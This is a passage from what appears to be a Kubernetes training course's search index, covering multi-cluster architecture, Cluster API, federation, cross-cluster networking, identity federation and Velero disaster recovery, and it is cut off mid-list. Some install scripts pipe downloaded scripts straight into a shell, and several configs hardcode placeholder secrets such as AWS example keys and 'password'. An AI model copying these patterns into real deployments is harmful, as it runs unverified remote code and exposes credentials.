<li>CIS Benchmark Structure - Sections, scoring, and methodology</li> <li>kube-bench - Installation, usage, and continuous scanning</li> <li>Control Plane Hardening - API server, controller manager, scheduler</li> <li>Worker Node Security - Kubelet configuration and file permissions</li> <li>Policies - RBAC, Pod Security, Network Policies, Secrets</li> <li>Automated Remediation - Ansible playbooks and GitOps</li> <li>Compliance Reporting - Metrics, dashboards, and monitoring</li> <li>Continuous Compliance - Integration into CI/CD and operations</li> </ol>"},{"location":"13-cis-compliance/#hands-on-labs","title":"Hands-On Labs","text":"<ol> <li>Run kube-bench and analyze results</li> <li>Fix failing CIS checks on test cluster</li> <li>Implement automated remediation with Ansible</li> <li>Create compliance dashboard in Grafana</li> <li>Integrate kube-bench into CI/CD pipeline</li> <li>Conduct compliance audit simulation</li> <li>Build custom compliance policies for your organization</li> </ol>"},{"location":"13-cis-compliance/#additional-resources","title":"Additional Resources","text":"<ul> <li>CIS Kubernetes Benchmark v1.8</li> <li>kube-bench GitHub</li> <li>Kubernetes Hardening Guide (NSA/CISA)</li> <li>NIST SP 800-190: Container Security</li> </ul> <p>Next Module: Module 14 - Multi-cluster and Federation</p>"},{"location":"14-multi-cluster/","title":"Module 14: Multi-cluster and Federation","text":""},{"location":"14-multi-cluster/#overview","title":"Overview","text":"<p>Estimated Time: 8-9 hours</p> <p>Module Type: Advanced Architecture and Operations</p> <p>Prerequisites: - Module 03 - Networking Fundamentals - Module 05 - Authentication and Authorization - Module 10 - Network Security - Understanding of distributed systems and high availability - Familiarity with service mesh concepts and disaster recovery</p> <p>Multi-cluster Kubernetes architectures enable scalability, geographic distribution, disaster recovery, and compliance requirements. This module covers multi-cluster architecture patterns, Cluster API for cluster lifecycle management, federation strategies using kubefed and service mesh, cross-cluster networking with Submariner and Cilium Cluster Mesh, identity federation, disaster recovery strategies, and multi-region deployment patterns. Based on CNCF best practices and production deployments from enterprises running Kubernetes at scale.</p>"},{"location":"14-multi-cluster/#learning-objectives","title":"Learning Objectives","text":"<p>By the end of this module, you will be able to:</p> <ol> <li>Design multi-cluster architectures for various use cases</li> <li>Deploy and manage clusters using Cluster API</li> <li>Implement federation strategies with kubefed and service mesh</li> <li>Configure cross-cluster networking with Submariner and Cilium</li> <li>Synchronize RBAC and identity across clusters</li> <li>Implement disaster recovery and business continuity</li> <li>Deploy multi-region applications with traffic management</li> <li>Design for high availability across clusters</li> <li>Manage secrets and configuration across clusters</li> <li>Monitor and observe multi-cluster environments</li> </ol>"},{"location":"14-multi-cluster/#1-multi-cluster-architecture-patterns","title":"1. Multi-cluster Architecture Patterns","text":""},{"location":"14-multi-cluster/#11-common-multi-cluster-patterns","title":"1.1 Common Multi-cluster Patterns","text":"<pre><code>graph TB\n    subgraph \"Pattern 1: Geographic Distribution\"\n        A1[US-East Cluster] --&gt; LB1[Global Load Balancer]\n        A2[US-West Cluster] --&gt; LB1\n        A3[EU Cluster] --&gt; LB1\n        A4[APAC Cluster] --&gt; LB1\n        LB1 --&gt; U1[Users]\n    end\n\n    subgraph \"Pattern 2: Environment Isolation\"\n        B1[Dev Cluster]\n        B2[Staging Cluster]\n        B3[Production Cluster]\n        B1 --&gt; B2\n        B2 --&gt; B3\n    end\n\n    subgraph \"Pattern 3: Workload Segmentation\"\n        C1[Compute Cluster] --&gt; C3[Data Cluster]\n        C2[ML/AI Cluster] --&gt; C3\n        C3 --&gt; C4[Storage Backend]\n    end\n\n    subgraph \"Pattern 4: Disaster Recovery\"\n        D1[Primary Cluster] -.-&gt;|Replicate| D2[DR Cluster]\n        D1 --&gt; D3[Active Traffic]\n        D2 -.-&gt;|Failover| D3\n    end\n\n    style A1 fill:#4ecdc4\n    style A2 fill:#4ecdc4\n    style A3 fill:#4ecdc4\n    style A4 fill:#4ecdc4\n    style D1 fill:#ff6b6b\n    style D2 fill:#ffe66d</code></pre>"},{"location":"14-multi-cluster/#12-decision-matrix-when-to-use-multi-cluster","title":"1.2 Decision Matrix: When to Use Multi-cluster","text":"Use Case Single Cluster Multi-cluster Rationale Small team, single app \u2705 Recommended \u274c Overkill Simplicity wins Geographic distribution \u274c High latency \u2705 Required Low latency for users Compliance (data residency) \u274c May violate \u2705 Required Data must stay in region Blast radius reduction \u26a0\ufe0f Namespaces help \u2705 Better isolation Full isolation between clusters Resource limits (1000+ nodes) \u274c Scale limits \u2705 Required Exceeds single cluster limits Disaster recovery \u26a0\ufe0f Multi-AZ only \u2705 Recommended Survive region failure Org boundaries (multi-tenant) \u26a0\ufe0f Complex RBAC \u2705 Better isolation Clean separation of concerns Heterogeneous workloads \u26a0\ufe0f Node pools \u2705 Cleaner Different configs per cluster"},{"location":"14-multi-cluster/#13-reference-architecture-multi-region-production","title":"1.3 Reference Architecture: Multi-region Production","text":"<p>Architecture Overview:</p> <pre><code># Multi-region production architecture\narchitecture:\n  regions:\n    - name: us-east-1\n      clusters:\n        - name: prod-use1-01\n          purpose: production workloads\n          size: 100 nodes\n          k8s_version: 1.29\n        - name: prod-use1-02\n          purpose: production workloads (HA pair)\n          size: 100 nodes\n          k8s_version: 1.29\n\n    - name: us-west-2\n      clusters:\n        - name: prod-usw2-01\n          purpose: production workloads\n          size: 80 nodes\n          k8s_version: 1.29\n\n    - name: eu-central-1\n      clusters:\n        - name: prod-euc1-01\n          purpose: production workloads + GDPR\n          size: 60 nodes\n          k8s_version: 1.29\n\n  management:\n    cluster: mgmt-use1-01\n    purpose: Fleet management, GitOps, monitoring\n    size: 20 nodes\n    tools:\n      - Cluster API\n      - ArgoCD\n      - Prometheus Federation\n      - Thanos\n\n  networking:\n    mesh: Cilium Cluster Mesh\n    cross_cluster: Submariner\n    ingress: Global Load Balancer (AWS Global Accelerator)\n    egress: Centralized per region\n\n  data:\n    replication: Active-Active\n    backup: Multi-region S3\n    database: CockroachDB (geo-distributed)\n\n  identity:\n    federation: Dex with OIDC\n    rbac_sync: kubefed RBAC controller\n</code></pre>"},{"location":"14-multi-cluster/#2-cluster-api-overview","title":"2. Cluster API Overview","text":""},{"location":"14-multi-cluster/#21-cluster-api-architecture","title":"2.1 Cluster API Architecture","text":"<pre><code>graph TB\n    A[Management Cluster] --&gt; B[Cluster API Controller]\n    B --&gt; C[Infrastructure Provider]\n    B --&gt; D[Bootstrap Provider]\n    B --&gt; E[Control Plane Provider]\n\n    C --&gt; F[AWS/Azure/GCP/VMware]\n    D --&gt; G[kubeadm/k3s/Talos]\n    E --&gt; H[Control Plane Machines]\n\n    H --&gt; I[Worker Nodes]\n\n    J[GitOps Repo] --&gt; K[ArgoCD/Flux]\n    K --&gt; A\n    K --&gt; L[Cluster Manifests]\n    L --&gt; B\n\n    style A fill:#4169e1\n    style B fill:#ff6b6b\n    style J fill:#90ee90</code></pre>"},{"location":"14-multi-cluster/#22-installing-cluster-api","title":"2.2 Installing Cluster API","text":"<p>Bootstrap Management Cluster:</p> <pre><code>#!/bin/bash\n# install-cluster-api.sh\n\nset -e\n\necho \"=== Installing Cluster API ===\"\n\n# Install clusterctl\ncurl -L https://github.com/kubernetes-sigs/cluster-api/releases/download/v1.6.1/clusterctl-linux-amd64 \\\n  -o clusterctl\nchmod +x clusterctl\nsudo mv clusterctl /usr/local/bin/\n\n# Set provider credentials (AWS example)\nexport AWS_REGION=us-east-1\nexport AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE\nexport AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\nexport AWS_B64ENCODED_CREDENTIALS=$(clusterawsadm bootstrap credentials encode-as-profile)\n\n# Initialize management cluster\nclusterctl init \\\n  --infrastructure aws \\\n  --bootstrap kubeadm \\\n  --control-plane kubeadm\n\n# Verify installation\nkubectl get pods -n capi-system\nkubectl get pods -n capi-kubeadm-bootstrap-system\nkubectl get pods -n capi-kubeadm-control-plane-system\nkubectl get pods -n capa-system\n\necho \"=== Cluster API installed successfully ===\"\n</code></pre>"},{"location":"14-multi-cluster/#23-creating-workload-clusters","title":"2.3 Creating Workload Clusters","text":"<p>Cluster Manifest:</p> <pre><code># workload-cluster.yaml\napiVersion: cluster.x-k8s.io/v1beta1\nkind: Cluster\nmetadata:\n  name: prod-use1-01\n  namespace: default\nspec:\n  clusterNetwork:\n    pods:\n      cidrBlocks:\n        - 10.244.0.0/16\n    services:\n      cidrBlocks:\n        - 10.96.0.0/12\n  infrastructureRef:\n    apiVersion: infrastructure.cluster.x-k8s.io/v1beta2\n    kind: AWSCluster\n    name: prod-use1-01\n  controlPlaneRef:\n    apiVersion: controlplane.cluster.x-k8s.io/v1beta1\n    kind: KubeadmControlPlane\n    name: prod-use1-01-control-plane\n---\napiVersion: infrastructure.cluster.x-k8s.io/v1beta2\nkind: AWSCluster\nmetadata:\n  name: prod-use1-01\n  namespace: default\nspec:\n  region: us-east-1\n  sshKeyName: k8s-admin\n  network:\n    vpc:\n      availabilityZoneUsageLimit: 3\n      availabilityZoneSelection: Ordered\n    subnets:\n      - availabilityZone: us-east-1a\n        cidrBlock: 10.0.0.0/24\n        isPublic: true\n      - availabilityZone: us-east-1b\n        cidrBlock: 10.0.1.0/24\n        isPublic: true\n      - availabilityZone: us-east-1c\n        cidrBlock: 10.0.2.0/24\n        isPublic: true\n      - availabilityZone: us-east-1a\n        cidrBlock: 10.0.10.0/24\n        isPublic: false\n      - availabilityZone: us-east-1b\n        cidrBlock: 10.0.11.0/24\n        isPublic: false\n      - availabilityZone: us-east-1c\n        cidrBlock: 10.0.12.0/24\n        isPublic: false\n  bastion:\n    enabled: true\n---\napiVersion: controlplane.cluster.x-k8s.io/v1beta1\nkind: KubeadmControlPlane\nmetadata:\n  name: prod-use1-01-control-plane\n  namespace: default\nspec:\n  version: v1.29.0\n  replicas: 3\n  machineTemplate:\n    infrastructureRef:\n      apiVersion: infrastructure.cluster.x-k8s.io/v1beta2\n      kind: AWSMachineTemplate\n      name: prod-use1-01-control-plane\n  kubeadmConfigSpec:\n    initConfiguration:\n      nodeRegistration:\n        kubeletExtraArgs:\n          cloud-provider: aws\n    clusterConfiguration:\n      apiServer:\n        extraArgs:\n          cloud-provider: aws\n          audit-log-path: /var/log/kubernetes/audit.log\n          audit-log-maxage: \"30\"\n          audit-log-maxbackup: \"10\"\n          audit-log-maxsize: \"100\"\n      controllerManager:\n        extraArgs:\n          cloud-provider: aws\n    joinConfiguration:\n      nodeRegistration:\n        kubeletExtraArgs:\n          cloud-provider: aws\n---\napiVersion: infrastructure.cluster.x-k8s.io/v1beta2\nkind: AWSMachineTemplate\nmetadata:\n  name: prod-use1-01-control-plane\n  namespace: default\nspec:\n  template:\n    spec:\n      instanceType: t3.large\n      iamInstanceProfile: control-plane.cluster-api-provider-aws.sigs.k8s.io\n      sshKeyName: k8s-admin\n      ami:\n        id: ami-0c55b159cbfafe1f0\n---\napiVersion: cluster.x-k8s.io/v1beta1\nkind: MachineDeployment\nmetadata:\n  name: prod-use1-01-workers\n  namespace: default\nspec:\n  clusterName: prod-use1-01\n  replicas: 10\n  selector:\n    matchLabels: {}\n  template:\n    spec:\n      clusterName: prod-use1-01\n      version: v1.29.0\n      bootstrap:\n        configRef:\n          apiVersion: bootstrap.cluster.x-k8s.io/v1beta1\n          kind: KubeadmConfigTemplate\n          name: prod-use1-01-workers\n      infrastructureRef:\n        apiVersion: infrastructure.cluster.x-k8s.io/v1beta2\n        kind: AWSMachineTemplate\n        name: prod-use1-01-workers\n---\napiVersion: infrastructure.cluster.x-k8s.io/v1beta2\nkind: AWSMachineTemplate\nmetadata:\n  name: prod-use1-01-workers\n  namespace: default\nspec:\n  template:\n    spec:\n      instanceType: t3.xlarge\n      iamInstanceProfile: nodes.cluster-api-provider-aws.sigs.k8s.io\n      sshKeyName: k8s-admin\n      ami:\n        id: ami-0c55b159cbfafe1f0\n---\napiVersion: bootstrap.cluster.x-k8s.io/v1beta1\nkind: KubeadmConfigTemplate\nmetadata:\n  name: prod-use1-01-workers\n  namespace: default\nspec:\n  template:\n    spec:\n      joinConfiguration:\n        nodeRegistration:\n          kubeletExtraArgs:\n            cloud-provider: aws\n</code></pre> <p>Deploy and Manage:</p> <pre><code># Create workload cluster\nkubectl apply -f workload-cluster.yaml\n\n# Watch cluster creation\nwatch kubectl get clusters,machines,kubeadmcontrolplanes\n\n# Get kubeconfig for new cluster\nclusterctl get kubeconfig prod-use1-01 &gt; prod-use1-01.kubeconfig\n\n# Verify cluster\nkubectl --kubeconfig=prod-use1-01.kubeconfig get nodes\n\n# Scale workers\nkubectl patch machinedeployment prod-use1-01-workers \\\n  --type merge \\\n  --patch '{\"spec\":{\"replicas\":20}}'\n\n# Upgrade cluster\nkubectl patch kubeadmcontrolplane prod-use1-01-control-plane \\\n  --type merge \\\n  --patch '{\"spec\":{\"version\":\"v1.29.1\"}}'\n</code></pre>"},{"location":"14-multi-cluster/#24-cluster-lifecycle-management","title":"2.4 Cluster Lifecycle Management","text":"<p>Automated Cluster Upgrades:</p> <pre><code># cluster-upgrade-policy.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: cluster-upgrade-policy\n  namespace: default\ndata:\n  policy.yaml: |\n    clusters:\n      - name: prod-*\n        upgrade:\n          schedule: \"0 2 * * SUN\"  # Sunday 2 AM\n          strategy: RollingUpdate\n          max_unavailable: 1\n          pre_checks:\n            - kube-bench\n            - pod-security-check\n          post_checks:\n            - smoke-tests\n            - integration-tests\n\n      - name: dev-*\n        upgrade:\n          auto: true\n          track: stable\n\n      - name: staging-*\n        upgrade:\n          approval: manual\n          track: latest\n</code></pre>"},{"location":"14-multi-cluster/#3-federation-strategies","title":"3. Federation Strategies","text":""},{"location":"14-multi-cluster/#31-kubefed-installation-and-configuration","title":"3.1 kubefed Installation and Configuration","text":"<p>Install kubefed:</p> <pre><code>#!/bin/bash\n# install-kubefed.sh\n\n# Install kubefedctl\nVERSION=0.10.0\ncurl -LO \"https://github.com/kubernetes-sigs/kubefed/releases/download/v${VERSION}/kubefedctl-${VERSION}-linux-amd64.tgz\"\ntar -xzf \"kubefedctl-${VERSION}-linux-amd64.tgz\"\nsudo mv kubefedctl /usr/local/bin/\n\n# Install kubefed in host cluster\nhelm repo add kubefed-charts https://raw.githubusercontent.com/kubernetes-sigs/kubefed/master/charts\nhelm install kubefed kubefed-charts/kubefed \\\n  --namespace kube-federation-system \\\n  --create-namespace\n\n# Join member clusters\nkubefedctl join prod-use1 \\\n  --cluster-context prod-use1-01 \\\n  --host-cluster-context mgmt-cluster \\\n  --v=2\n\nkubefedctl join prod-usw2 \\\n  --cluster-context prod-usw2-01 \\\n  --host-cluster-context mgmt-cluster \\\n  --v=2\n\n# Verify federation\nkubectl get kubefedclusters -n kube-federation-system\n</code></pre>"},{"location":"14-multi-cluster/#32-federated-resources","title":"3.2 Federated Resources","text":"<p>Federated Deployment:</p> <pre><code># federated-app.yaml\napiVersion: types.kubefed.io/v1beta1\nkind: FederatedDeployment\nmetadata:\n  name: nginx-app\n  namespace: default\nspec:\n  template:\n    metadata:\n      labels:\n        app: nginx\n    spec:\n      replicas: 3\n      selector:\n        matchLabels:\n          app: nginx\n      template:\n        metadata:\n          labels:\n            app: nginx\n        spec:\n          containers:\n          - name: nginx\n            image: nginx:1.25\n            ports:\n            - containerPort: 80\n  placement:\n    clusters:\n      - name: prod-use1\n      - name: prod-usw2\n      - name: prod-euc1\n  overrides:\n    - clusterName: prod-use1\n      clusterOverrides:\n        - path: \"/spec/replicas\"\n          value: 5\n    - clusterName: prod-euc1\n      clusterOverrides:\n        - path: \"/spec/template/spec/containers/0/env\"\n          value:\n            - name: REGION\n              value: eu-central-1\n---\napiVersion: types.kubefed.io/v1beta1\nkind: FederatedService\nmetadata:\n  name: nginx-service\n  namespace: default\nspec:\n  template:\n    spec:\n      type: LoadBalancer\n      selector:\n        app: nginx\n      ports:\n      - protocol: TCP\n        port: 80\n        targetPort: 80\n  placement:\n    clusters:\n      - name: prod-use1\n      - name: prod-usw2\n      - name: prod-euc1\n</code></pre>"},{"location":"14-multi-cluster/#33-service-mesh-federation-istio-multi-cluster","title":"3.3 Service Mesh Federation (Istio Multi-cluster)","text":"<p>Istio Multi-primary Installation:</p> <pre><code>#!/bin/bash\n# setup-istio-multicluster.sh\n\n# Install istioctl\ncurl -L https://istio.io/downloadIstio | ISTIO_VERSION=1.20.1 sh -\ncd istio-1.20.1\nexport PATH=$PWD/bin:$PATH\n\n# Configure cluster 1 as primary\nkubectl config use-context prod-use1-01\n\ncat &lt;&lt;EOF | istioctl install -y -f -\napiVersion: install.istio.io/v1alpha1\nkind: IstioOperator\nspec:\n  values:\n    global:\n      meshID: mesh1\n      multiCluster:\n        clusterName: cluster1\n      network: network1\nEOF\n\n# Install east-west gateway\nkubectl apply -f samples/multicluster/expose-services.yaml\n\n# Get gateway address\nexport DISCOVERY_ADDRESS=$(kubectl get svc istio-eastwestgateway \\\n  -n istio-system -o jsonpath='{.status.loadBalancer.ingress[0].ip}')\n\n# Configure cluster 2 as primary\nkubectl config use-context prod-usw2-01\n\ncat &lt;&lt;EOF | istioctl install -y -f -\napiVersion: install.istio.io/v1alpha1\nkind: IstioOperator\nspec:\n  values:\n    global:\n      meshID: mesh1\n      multiCluster:\n        clusterName: cluster2\n      network: network2\nEOF\n\n# Enable endpoint discovery between clusters\nistioctl create-remote-secret \\\n  --context=prod-use1-01 \\\n  --name=cluster1 | \\\n  kubectl apply -f - --context=prod-usw2-01\n\nistioctl create-remote-secret \\\n  --context=prod-usw2-01 \\\n  --name=cluster2 | \\\n  kubectl apply -f - --context=prod-use1-01\n\n# Verify multi-cluster mesh\nkubectl get services -n istio-system\n</code></pre> <p>Cross-cluster Service Discovery:</p> <pre><code># multi-cluster-service.yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: api-service\n  namespace: production\nspec:\n  type: ClusterIP\n  selector:\n    app: api\n  ports:\n  - port: 8080\n    targetPort: 8080\n---\napiVersion: networking.istio.io/v1beta1\nkind: ServiceEntry\nmetadata:\n  name: api-service-remote\n  namespace: production\nspec:\n  hosts:\n  - api-service.production.global\n  location: MESH_INTERNAL\n  ports:\n  - number: 8080\n    name: http\n    protocol: HTTP\n  resolution: DNS\n  endpoints:\n  - address: api-service.production.svc.cluster.local\n    locality: us-east-1\n  - address: api-service.production.cluster2.global\n    locality: us-west-2\n---\napiVersion: networking.istio.io/v1beta1\nkind: DestinationRule\nmetadata:\n  name: api-service-failover\n  namespace: production\nspec:\n  host: api-service.production.global\n  trafficPolicy:\n    loadBalancer:\n      localityLbSetting:\n        enabled: true\n        distribute:\n        - from: us-east-1\n          to:\n            \"us-east-1\": 80\n            \"us-west-2\": 20\n        failover:\n        - from: us-east-1\n          to: us-west-2\n</code></pre>"},{"location":"14-multi-cluster/#4-cross-cluster-networking","title":"4. Cross-cluster Networking","text":""},{"location":"14-multi-cluster/#41-submariner-for-cross-cluster-connectivity","title":"4.1 Submariner for Cross-cluster Connectivity","text":"<p>Install Submariner:</p> <pre><code>#!/bin/bash\n# install-submariner.sh\n\n# Download subctl\ncurl -Ls https://get.submariner.io | bash\nexport PATH=$PATH:~/.local/bin\n\n# Deploy broker\nkubectl config use-context mgmt-cluster\nsubctl deploy-broker --kubeconfig mgmt-cluster.kubeconfig\n\n# Join cluster 1\nkubectl config use-context prod-use1-01\nsubctl join broker-info.subm --kubeconfig prod-use1-01.kubeconfig \\\n  --clusterid cluster1 \\\n  --natt=false \\\n  --cable-driver vxlan\n\n# Join cluster 2\nkubectl config use-context prod-usw2-01\nsubctl join broker-info.subm --kubeconfig prod-usw2-01.kubeconfig \\\n  --clusterid cluster2 \\\n  --natt=false \\\n  --cable-driver vxlan\n\n# Verify connectivity\nsubctl show all\nsubctl verify --only connectivity\n</code></pre> <p>Export Services Across Clusters:</p> <pre><code># service-export.yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: database\n  namespace: data-tier\nspec:\n  type: ClusterIP\n  selector:\n    app: postgres\n  ports:\n  - port: 5432\n    targetPort: 5432\n---\napiVersion: multicluster.x-k8s.io/v1alpha1\nkind: ServiceExport\nmetadata:\n  name: database\n  namespace: data-tier\n</code></pre> <p>Import Services:</p> <pre><code># Service automatically imported, access via:\n# database.data-tier.svc.clusterset.local\napiVersion: v1\nkind: Pod\nmetadata:\n  name: app\n  namespace: applications\nspec:\n  containers:\n  - name: app\n    image: myapp:v1.0.0\n    env:\n    - name: DATABASE_URL\n      value: postgresql://user:pass@database.data-tier.svc.clusterset.local:5432/mydb\n</code></pre>"},{"location":"14-multi-cluster/#42-cilium-cluster-mesh","title":"4.2 Cilium Cluster Mesh","text":"<p>Setup Cilium Cluster Mesh:</p> <pre><code>#!/bin/bash\n# setup-cilium-clustermesh.sh\n\n# Install Cilium in cluster 1\nkubectl config use-context prod-use1-01\ncilium install \\\n  --cluster-name cluster1 \\\n  --cluster-id 1 \\\n  --ipam kubernetes \\\n  --set hubble.relay.enabled=true\n\n# Install Cilium in cluster 2\nkubectl config use-context prod-usw2-01\ncilium install \\\n  --cluster-name cluster2 \\\n  --cluster-id 2 \\\n  --ipam kubernetes \\\n  --set hubble.relay.enabled=true\n\n# Enable Cluster Mesh\nkubectl config use-context prod-use1-01\ncilium clustermesh enable --service-type LoadBalancer\n\nkubectl config use-context prod-usw2-01\ncilium clustermesh enable --service-type LoadBalancer\n\n# Connect clusters\nkubectl config use-context prod-use1-01\ncilium clustermesh connect \\\n  --context prod-use1-01 \\\n  --destination-context prod-usw2-01\n\n# Verify connectivity\ncilium clustermesh status\n\n# Test with Hubble\nhubble observe --pod default/app --follow\n</code></pre> <p>Global Service:</p> <pre><code># global-service.yaml\napiVersion: v1\nkind: Service\nmetadata:\n  name: global-api\n  namespace: production\n  annotations:\n    io.cilium/global-service: \"true\"\n    io.cilium/service-affinity: \"local\"\nspec:\n  type: ClusterIP\n  selector:\n    app: api\n  ports:\n  - port: 8080\n    targetPort: 8080\n</code></pre>"},{"location":"14-multi-cluster/#5-identity-federation-and-rbac-synchronization","title":"5. Identity Federation and RBAC Synchronization","text":""},{"location":"14-multi-cluster/#51-federated-authentication-with-dex","title":"5.1 Federated Authentication with Dex","text":"<p>Dex Configuration:</p> <pre><code># dex-config.yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: dex\n  namespace: auth\ndata:\n  config.yaml: |\n    issuer: https://dex.example.com\n\n    storage:\n      type: kubernetes\n      config:\n        inCluster: true\n\n    web:\n      http: 0.0.0.0:5556\n\n    connectors:\n    - type: ldap\n      id: ldap\n      name: LDAP\n      config:\n        host: ldap.example.com:636\n        insecureSkipVerify: false\n        bindDN: cn=admin,dc=example,dc=com\n        bindPW: password\n        userSearch:\n          baseDN: ou=users,dc=example,dc=com\n          filter: \"(objectClass=person)\"\n          username: uid\n          idAttr: uid\n          emailAttr: mail\n          nameAttr: cn\n        groupSearch:\n          baseDN: ou=groups,dc=example,dc=com\n          filter: \"(objectClass=groupOfNames)\"\n          userAttr: DN\n          groupAttr: member\n          nameAttr: cn\n\n    oauth2:\n      skipApprovalScreen: true\n\n    staticClients:\n    - id: kubernetes\n      redirectURIs:\n      - 'https://prod-use1-01.example.com/callback'\n      - 'https://prod-usw2-01.example.com/callback'\n      - 'https://prod-euc1-01.example.com/callback'\n      name: 'Kubernetes Clusters'\n      secret: kubernetes-client-secret\n---\napiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dex\n  namespace: auth\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: dex\n  template:\n    metadata:\n      labels:\n        app: dex\n    spec:\n      containers:\n      - name: dex\n        image: ghcr.io/dexidp/dex:v2.37.0\n        command: [\"/usr/local/bin/dex\", \"serve\", \"/etc/dex/config.yaml\"]\n        ports:\n        - name: http\n          containerPort: 5556\n        volumeMounts:\n        - name: config\n          mountPath: /etc/dex\n      volumes:\n      - name: config\n        configMap:\n          name: dex\n</code></pre> <p>API Server OIDC Configuration:</p> <pre><code># Apply to all cluster API servers\napiVersion: v1\nkind: Pod\nmetadata:\n  name: kube-apiserver\n  namespace: kube-system\nspec:\n  containers:\n  - name: kube-apiserver\n    command:\n    - kube-apiserver\n    - --oidc-issuer-url=https://dex.example.com\n    - --oidc-client-id=kubernetes\n    - --oidc-username-claim=email\n    - --oidc-groups-claim=groups\n    - --oidc-ca-file=/etc/kubernetes/pki/oidc-ca.crt\n</code></pre>"},{"location":"14-multi-cluster/#52-rbac-synchronization","title":"5.2 RBAC Synchronization","text":"<p>Federated ClusterRole:</p> <pre><code># federated-rbac.yaml\napiVersion: types.kubefed.io/v1beta1\nkind: FederatedClusterRole\nmetadata:\n  name: developer\nspec:\n  template:\n    rules:\n    - apiGroups: [\"\", \"apps\", \"batch\"]\n      resources: [\"*\"]\n      verbs: [\"get\", \"list\", \"watch\"]\n    - apiGroups: [\"\"]\n      resources: [\"pods/log\", \"pods/portforward\"]\n      verbs: [\"get\", \"list\", \"create\"]\n  placement:\n    clusters:\n    - name: prod-use1\n    - name: prod-usw2\n    - name: prod-euc1\n---\napiVersion: types.kubefed.io/v1beta1\nkind: FederatedClusterRoleBinding\nmetadata:\n  name: developers\nspec:\n  template:\n    roleRef:\n      apiGroup: rbac.authorization.k8s.io\n      kind: ClusterRole\n      name: developer\n    subjects:\n    - kind: Group\n      name: developers\n      apiGroup: rbac.authorization.k8s.io\n  placement:\n    clusters:\n    - name: prod-use1\n    - name: prod-usw2\n    - name: prod-euc1\n</code></pre>"},{"location":"14-multi-cluster/#6-disaster-recovery-strategies","title":"6. Disaster Recovery Strategies","text":""},{"location":"14-multi-cluster/#61-dr-architecture","title":"6.1 DR Architecture","text":"<pre><code>graph TB\n    subgraph \"Primary Region: us-east-1\"\n        P1[Prod Cluster 1] --&gt; P2[RDS Primary]\n        P1 --&gt; P3[S3 Primary]\n        P1 --&gt; P4[etcd Primary]\n    end\n\n    subgraph \"DR Region: us-west-2\"\n        D1[DR Cluster] --&gt; D2[RDS Replica]\n        D1 --&gt; D3[S3 Replica]\n        D1 --&gt; D4[etcd Backup]\n    end\n\n    P2 -.-&gt;|Async Replication| D2\n    P3 -.-&gt;|Cross-region Replication| D3\n    P4 -.-&gt;|Velero Backup| D4\n\n    U[Users] --&gt; R[Route 53]\n    R --&gt;|Active| P1\n    R -.-&gt;|Failover| D1\n\n    M[Monitoring] --&gt; P1\n    M --&gt; D1\n    M --&gt; F{Health Check}\n    F --&gt;|Failure| T[Trigger Failover]\n    T --&gt; R\n\n    style P1 fill:#90ee90\n    style D1 fill:#ffe66d\n    style F fill:#ff6b6b</code></pre>"},{"location":"14-multi-cluster/#62-backup-and-restore-with-velero","title":"6.2 Backup and Restore with Velero","text":"<p>Install Velero:</p> <pre><code>#!/bin/bash\n# install-velero.sh\n\n# Download Velero\nwget https://github.com/vmware-tanzu/velero/releases/download/v1.12.1/velero-v1.12.1-linux-amd64.tar.gz\ntar -xvf velero-v1.12.1-linux-amd64.tar.gz\nsudo mv velero-v1.12.1-linux-amd64/velero /usr/local/bin/\n\n# Install Velero with AWS plugin\nvelero install \\\n  --provider aws \\\n  --plugins velero/velero-plugin-for-aws:v1.8.0 \\\n  --bucket velero-backups-prod \\\n  --secret-file ./credentials-velero \\\n  --backup-location-config region=us-east-1 \\\n  --snapshot-location-config region=us-east-1 \\\n  --use-volume-snapshots=true \\\n  --use-node-agent\n\n# Configure backup storage location for DR region\nvelero backup-location create dr-backup \\\n  --provider aws \\\n  --bucket velero-backups-dr \\\n  --config region=us-west-2\n</code></pre> <p>Backup Schedules:</p> <pre><code># velero-schedules.yaml\napiVersion: velero.io/v1\nkind: Schedule\nmetadata:\n  name: daily-backup\n  namespace: velero\nspec:\n  schedule: \"0 2 * * *\"\n  template:\n    includedNamespaces:\n    - production\n    - staging\n    excludedResources:\n    - events\n    - events.events.k8s.io\n    ttl: 720h0m0s  # 30 days\n    storageLocation: dr-backup\n    volumeSnapshotLocations:\n    - dr-backup\n---\napiVersion: velero.io/v1\nkind: Schedule\nmetadata:\n  name: hourly-backup-critical\n  namespace: velero\nspec:\n  schedule: \"0 * * * *\"\n  template:\n    includedNamespaces:\n    - production\n    labelSelector:\n      matchLabels:\n        backup: critical\n    ttl: 168h0m0s  # 7 days\n    storageLocation: dr-backup\n</code></pre> <p>Disaster Recovery Restore:</p> <pre><code>#!/bin/bash\n# disaster-recovery-restore.sh\n\nset -e\n\necho \"=== DISASTER RECOVERY RESTORE ===\"\n\n# Switch to DR cluster\nkubectl config use-context dr-cluster-usw2\n\n# List available backups\nvelero backup get\n\n# Restore latest backup\nLATEST_BACKUP=$(velero backup get -o json | jq -r '.items | sort_by(.status.startTimestamp) | last | .metadata.name')\n\necho \"Restoring backup: ${LATEST_BACKUP}\"\n\n# Perform restore\nvelero restore create dr-restore-$(date +%Y%m%d-%H%M%S) \\\n  --from-backup ${LATEST_BACKUP} \\\n  --restore-volumes=true \\\n  --wait\n\n# Verify restore\nkubectl get all -n production\nkubectl get pv,pvc -n production\n\n# Update DNS to point to DR cluster\necho \"Updating Route 53...\"\naws route53 change-resource-record-sets \\\n  --hosted-zone-id Z1234567890ABC \\\n  --change-batch file://failover-dns-change.json\n\necho \"=== DR Restore Complete ===\"\necho \"Monitor application health and verify functionality\"\n</code></pre>"},{"location":"14-multi-cluster/#63-rto-and-rpo-optimization","title":"6.3 RTO and RPO Optimization","text":"<p>Recovery Time Objective (RTO) Strategies:</p> <ol> <li>Hot Standby (RTO: &lt; 5 minutes)</li> <li>Active-Active across regions</li> <li>Real-time replication</li> <li>DNS failover only</li> <li> <p>Highest cost</p> </li> <li> <p>Warm Standby (RTO: &lt; 30 minutes)</p> </li> <li>DR cluster running with minimal workload</li> <li>Scheduled backups (every 15 minutes)</li> <li>Scale up on failover</li> <li> <p>Medium cost</p> 